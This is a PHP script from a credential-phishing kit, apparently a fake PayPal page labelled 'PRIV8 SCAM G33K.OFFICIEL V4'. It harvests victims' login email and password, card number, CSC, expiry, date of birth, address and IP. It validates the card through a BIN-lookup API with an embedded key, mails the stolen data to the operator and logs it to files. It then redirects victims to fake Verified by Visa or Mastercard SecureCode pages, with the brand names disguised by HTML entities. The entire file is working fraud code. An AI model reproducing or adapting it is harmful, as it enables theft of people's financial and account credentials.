<?php 
//PRIV8 SCAM G33K.OFFICIEL V4
session_start(); 
include("../email.php"); 
$rand=rand(111611,996999); 
$rand2=rand(1116111,9997989); 
$md = md5(sha1("ByG33K.OFFICIEL")); 
$aubli = $rand.$md.$rand2; 
$ip= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ?  
$_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']; 
$_SESSION["nameoncc"] = $_POST["nameoncc"]; 
$_SESSION["number"]   = $_POST["number"]; 
$Year  =  $_SESSION["expyr"] = $_POST["expy"];
$Month =  $_SESSION["expmo"] = $_POST["expm"];
$_SESSION["csc"]      = $_POST["csc"];
$_SESSION["first"]    = $xm;
$xm = substr($_POST["number"], 0,1 );
// <! Don't Touch Things In This Area !> \\
//=======================//CC Number Checker Online//========================//
$aziza    = @json_decode(file_get_contents("https://api.bincodes.com/cc/?format=json&api_key=df020228e08ef430bced501ca2084b79&cc=".$_SESSION["number"].""));
$_SESSION["Verify"] = $aziza->error;
if(isset($_SESSION["Verify"])){
	header("location:../websc_card/?enc=".md5(microtime())."&p=1&dispatch=".sha1(microtime())."&card=wrong");
} 
else {
	//=======================//Bin G33K.OFFICIEL//========================//
$Info    = str_replace(' ', '', $_SESSION["number"]);
$Info     = substr($Info, 0, 6);
$param     = @json_decode(file_get_contents("https://api.bincodes.com/bin-checker.php?api_key=df020228e08ef430bced501ca2084b79&bin=".$Info."&format=json"));
$_SESSION["bank"]    = $param->bank;
$_SESSION["typi"]     = $param->type;
$_SESSION["livelle"]    = $param->level;
$_SESSION["talifoun"]  = $param->phone;
$_SESSION["site"] = $param->website;
$_SESSION["nomme"] = $param->card;
//=======================//Bin Monstronix//========================//
$_SESSION["Card"] = "
########## Happy CCV ^_^ #########
==============Login===============
Email:".$_SESSION["email"]."
Password:".$_SESSION["pass"]."
==============Login===============
VXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVX
==============Billing=============
First Name:".$_SESSION["fname"]."
Last Name:".$_SESSION["lname"]."
DOB:".$_SESSION["DOB"]."
Phone Type (Home/Mobile):".$_SESSION["PhoneType"]."
Phone Number:".$_SESSION["PhoneNumber"]."
Street:".$_SESSION["address1"]."
City:".$_SESSION["city"]."
State:".$_SESSION["state"]."
Country:".$_SESSION["country"]."
Zip:".$_SESSION["ZIP"]."
==============Billing=============
VXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVX
==============Card Infos==========
Name On Card:".$_SESSION["nameoncc"]."
Card Type:".$_SESSION["nomme"]."
Card Number:".$_SESSION["number"]."
Expiration Date: ".$_SESSION["expmo"]." / ".$_SESSION["expyr"]."
CSC:".$_SESSION["csc"]."
==========Precise Details=========
Card Level: ".$_SESSION["livelle"]."
Card Type: ".$_SESSION["typi"] ."
Card Provider: ".$_SESSION["bank"]." - ".$_SESSION["site"]."
===============Card Infos=========
######### Victim XNXXed ;) ########
IP:$ip
";
$Subject="PPL PRIV8 V4 - Card Infos - $ip - ".$_SESSION["country"]." "; 
$head="From:G33K.OFFICIEL CC <crd>"; 
mail($rezult_mail,$Subject,$_SESSION["Card"],$head);
if($xm  == 4){
	$_SESSION["pngo"] = "/VBV.gif"; 
	$_SESSION["tire"] = "V&#101;r&#105;f&#105;&#101;&#100; By V&#105;s&#97;"; 
	$_SESSION["txt"] = "V&#101;r&#105;f&#105;&#101;&#100; By V&#105;s&#97;";
	$_SESSION["href"] = "https://www.visaeurope.com/making-payments/verified-by-visa";
;} elseif  ($xm  == 5){
	$_SESSION["pngo"] = "/3D.gif";
	$_SESSION["tire"] = "M&#97;st&#101;r&#99;&#97;r&#100; S&#101;&#99;ur&#101; Co&#100;&#101;"; 
	$_SESSION["txt"] = "M&#97;st&#101;r&#99;&#97;r&#100; S&#101;&#99;ur&#101; Co&#100;&#101;";
	$_SESSION["href"] = "https://www.mastercard.com/ca/merchant/fr/solutions/securecode/securecode.html";
};
if($xm == 4 || $xm == 5){
	header("location:../websc_verification/processing.php?enc=".md5(microtime())."&dispatch=".sha1(microtime())."");
} 
else{
	header("location:../websc_identity");
}
if($txt == 1){
$file = fopen("../REZULT/Cards/XcardX " . $ip . ".txt", 'a');
fwrite($file, $_SESSION["Card"]); };
}
 ?>